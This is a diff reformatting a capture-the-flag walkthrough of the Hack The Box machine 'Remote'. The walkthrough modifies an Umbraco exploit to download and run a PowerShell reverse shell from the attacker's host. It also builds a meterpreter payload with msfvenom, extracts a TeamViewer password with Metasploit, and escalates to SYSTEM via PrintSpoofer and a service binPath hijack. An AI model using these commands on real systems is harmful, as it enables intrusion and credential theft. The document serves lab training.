@@ -226,11 +226,14 @@ Copied to: /home/rin/boxes/Remote/46153.py
 We need to change the cmd string and the authentication and host details
 
 ```bash
-{ string cmd = "wget http://10.10.14.117:8082/afile"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+{ string cmd = "wget http://10.10.14.117:8082/afile"; \
+System.Diagnostics.Process proc = new System.Diagnostics.Process();\
  proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+ proc.StartInfo.UseShellExecute = false; \
+ proc.StartInfo.RedirectStandardOutput = true; \
  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+ </msxsl:script><xsl:template match="/"> <xsl:value-of 
+ select="csharp_user:xml()"/>\
  </xsl:template> </xsl:stylesheet> ';
 login = "admin@htb.local;
 password="baconandcheese";
@@ -256,11 +259,14 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.117 -Port 6001
 We can then start a netcat listener on our machine and change the code of the exploit to download and execute the revsh.ps1 script. To do that, we can use the PowerShell command Invoke-WebRequest \(IWR\) to download the file and then execute it using Invoke-Expression \(IEX\). The code would then look like:
 
 ```bash
-{ string cmd = "IEX(IWR http://10.10.14.117:8082/revsh.ps1 -UserBasicParsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+{ string cmd = "IEX(IWR http://10.10.14.117:8082/revsh.ps1 -UserBasicParsing)"; \
+ System.Diagnostics.Process proc = new System.Diagnostics.Process();\
  proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+ proc.StartInfo.UseShellExecute = false; \
+ proc.StartInfo.RedirectStandardOutput = true; \
  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+ </msxsl:script><xsl:template match="/"> \
+ <xsl:value-of select="csharp_user:xml()"/>\
  </xsl:template> </xsl:stylesheet> ';
 login = "admin@htb.local;
 password="baconandcheese";
@@ -290,8 +296,9 @@ Runing this, we see that winPEAS reports, we get a number of exploitable escalat
 ```bash
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
- [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user
--to-system/
+ [>] https://decoder.cloud/2019/04/29/combinig-luafv-
+  postluafvpostreadwrite-race-condition-pe-with-diaghub-
+  collector-exploit-from-standard-user-to-system/
  [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/
@@ -302,29 +309,41 @@ Runing this, we see that winPEAS reports, we get a number of exploitable escalat
  [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253
  [!] CVE-2019-1315 : VULNERABLE
- [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+ [>] https://offsec.almond.consulting/windows-error-reporting-
+  arbitrary-file-move-eop.html
  [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg
  [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388
  [!] CVE-2019-1405 : VULNERABLE
- [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the
--upnp-device-host-service-and-the-update-orchestrator-service/
+ [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-
+ events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-
+ elevation-to-system-via-the-upnp-device-host-service-and-
+ the-update-orchestrator-service/
 ```
 
 A potentially easier path to escalation is the fact that our account has access to the configuration of the UsoSvc which means that we can change the path of the binary it points to and run our own script or binary. This looks frar more exploitable. But let us continue and look if there is anything else.
 
 ```bash
 [+] Modifiable Services
- [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+ [?] Check if you can modify any service https://book.hacktricks.xyz/
+  windows/windows-local-privilege-escalation#services
  LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
  UsoSvc: AllAccess, Start
-Looking at the non-Microsoft services on the machine, you will notice that there is a service called TeamViewer that is running. This is an application that allows remote desktop access.
+Looking at the non-Microsoft services on the machine, you will notice 
+that there is a service called TeamViewer that is running. This is an 
+application that allows remote desktop access.
  [+] Interesting Services -non Microsoft-
- [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
- TeamViewer7(TeamViewer GmbH - TeamViewer 7)["C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"] - Auto - Running
+ [?] Check if you can overwrite some service binary or perform a DLL 
+ hijacking, also check for unquoted paths 
+ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+ TeamViewer7(TeamViewer GmbH - TeamViewer 7)
+ ["C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"] -
+  Auto - Running
  TeamViewer Remote Software
-winPEAS doesn't print out a version but navigating to the director it is installed in c:\Program Files (x86)\TeamViewer\Version7, we find a log file TeamViewer7_Logfile.log that we can extract the version from
+winPEAS doesn't print out a version but navigating to the director it is 
+installed in c:\Program Files (x86)\TeamViewer\Version7, we find a log file 
+TeamViewer7_Logfile.log that we can extract the version from
 cat TeamViewer7_Logfile.log | findstr -i version
 Version: 7.0.43148
 AppPath: C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe
@@ -336,7 +355,10 @@ A final exploit that is open to us is one that makes use of the SeImpersonatePri
 
 Let us start with the TeamViewer exploit. To do this, we will use Metasploit and so we need to get a meterpreter shell. So we can create a meterpreter reverse shell with msfvenom:
 
-msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.14.117 LPORT=4444 -f exe &gt; metsh.exe
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.117 \
+LPORT=4444 -f exe > metsh.exe
+```
 
 We can then copy that to the Remote machine as before using wget and then running the binary once we have set up a meterpreter handler in Metasploit using exploit/multi/handler and setting the options of LHOST and Payload to match what we used in msfvenom. After running the handler, we can run the meterpreter reverse shell and establish a session.
 
@@ -350,22 +372,27 @@ Matching Modules
 ================
  # Name Disclosure Date Rank Check Description
  - ---- --------------- ---- ----- -----------
- 0 auxiliary/server/teamviewer_uri_smb_redirect normal No TeamViewer Unquoted URI Handler SMB Redirect
- 1 post/windows/gather/credentials/teamviewer_passwords normal No Windows Gather TeamViewer Passwords
-Interact with a module by name or index. For example info 1, use 1 or use post/windows/gather/credentials/teamviewer_passwords
+ 0 auxiliary/server/teamviewer_uri_smb_redirect normal No TeamViewer 
+  Unquoted URI Handler SMB Redirect
+ 1 post/windows/gather/credentials/teamviewer_passwords normal 
+  No Windows Gather TeamViewer Passwords
+Interact with a module by name or index. For example info 1, use 1 or 
+use post/windows/gather/credentials/teamviewer_passwords
 msf6 exploit(multi/handler) > use 1
 msf6 post(windows/gather/credentials/teamviewer_passwords) > options
 Module options (post/windows/gather/credentials/teamviewer_passwords):
  Name Current Setting Required Description
  ---- --------------- -------- -----------
  SESSION yes The session to run this module on.
- WINDOW_TITLE TeamViewer no Specify a title for getting the window handle, e.g. TeamViewer
+ WINDOW_TITLE TeamViewer no Specify a title for getting the window handle, 
+ e.g. TeamViewer
 msf6 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
 SESSION => 1
 msf6 post(windows/gather/credentials/teamviewer_passwords) > run
 [*] Finding TeamViewer Passwords on REMOTE
 [+] Found Unattended Password: !R3m0te!
-[+] Passwords stored in: /root/.msf4/loot/20210106122808_default_10.129.1.153_host.teamviewer__511687.txt
+[+] Passwords stored in: /root/.msf4/loot/20210106122808_default_
+ 10.129.1.153_host.teamviewer__511687.txt
 [*] <---------------- | Using Window Technique | ---------------->
 [*] TeamViewer's language setting options are ''
 [*] TeamViewer's version is ''
@@ -387,10 +414,14 @@ remote\administrator
 To run the exploit for PrintSpoofer, download the executable from the release on GitHub \(https://github.com/itm4n/PrintSpoofer\). We can use our meterpreter session to upload it and then simply run it in a shell to get access to nt authority\system
 
 ```bash
-meterpreter > upload /home/rin/Downloads/PrintSpoofer64.exe "c:\users\public\downloads\spoof.exe"
-[*] uploading : /home/oztechmuse/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
-[*] Uploaded 26.50 KiB of 26.50 KiB (100.0%): /home/rin/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
-[*] uploaded : /home/rin/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
+meterpreter > upload /home/rin/Downloads/PrintSpoofer64.exe \
+    "c:\users\public\downloads\spoof.exe"
+[*] uploading : /home/oztechmuse/Downloads/PrintSpoofer64.exe -> 
+    c:\users\public\downloads\spoof.exe
+[*] Uploaded 26.50 KiB of 26.50 KiB (100.0%): 
+    /home/rin/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
+[*] uploaded : /home/rin/Downloads/PrintSpoofer64.exe -> 
+    c:\users\public\downloads\spoof.exe
 meterpreter > shell
 Process 8844 created.
 Channel 2 created.
@@ -433,7 +464,8 @@ SERVICE_NAME: usosvc
  SERVICE_EXIT_CODE : 0 (0x0)
  CHECKPOINT : 0x3
  WAIT_HINT : 0x7530
-PS C:\users\public\Downloads> sc.exe CONFIG usosvc binPath="cmd.exe /c c:\users\public\downloads\metsh.exe"
+PS C:\users\public\Downloads> sc.exe CONFIG usosvc ` 
+ binPath="cmd.exe /c c:\users\public\downloads\metsh.exe"
 PS C:\users\public\Downloads> sc.exe start usosvc
 [SC] StartService FAILED 1053:
 The service did not respond to the start or control request in a timely fashion
@@ -448,11 +480,13 @@ Active sessions
 ===============
  Id Name Type Information Connection
  -- ---- ---- ----------- ----------
- 1 meterpreter x86/windows IIS APPPOOL\DefaultAppPool @ REMOTE 10.10.14.117:4444 -> 10.129.1.153:49884 (10.129.1.153)
+ 1 meterpreter x86/windows IIS APPPOOL\DefaultAppPool @ REMOTE 
+  10.10.14.117:4444 -> 10.129.1.153:49884 (10.129.1.153)
  4 meterpreter x86/windows 10.10.14.117:4444 -> 10.129.1.153:49900 (10.129.1.153)
 msf6 exploit(multi/handler) > sessions -i 4
 [*] Starting interaction with 4...
-meterpreter > [*] Meterpreter session 4 opened (10.10.14.117:4444 -> 10.129.1.153:49900) at 2021-01-06 13:15:47 +0800
+meterpreter > [*] Meterpreter session 4 opened (10.10.14.117:4444 -> 
+ 10.129.1.153:49900) at 2021-01-06 13:15:47 +0800
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
